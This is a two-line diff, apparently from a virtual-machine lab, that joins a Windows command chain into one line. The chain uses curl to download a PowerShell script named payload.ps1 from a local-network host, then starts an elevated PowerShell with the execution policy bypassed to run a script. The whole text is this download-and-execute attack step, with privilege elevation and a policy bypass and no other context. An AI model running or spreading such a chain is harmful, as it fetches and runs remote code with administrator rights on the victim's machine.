@@ -1,2 +1,1 @@
-curl -o C:\Users\vboxuser\Downloads\payload.ps1 http://192.168.0.115/test.ps1
-powershell -Command "Start-Process powershell -ArgumentList '-NoExit', '-ExecutionPolicy Bypass', '-File', '\path\to\test.ps1' -Verb RunAs"
+curl -o C:\Users\vboxuser\Downloads\payload.ps1 http://192.168.0.115/test.ps1; powershell -Command "Start-Process powershell -ArgumentList '-NoExit', '-ExecutionPolicy Bypass', '-File', '\path\to\test.ps1' -Verb RunAs"
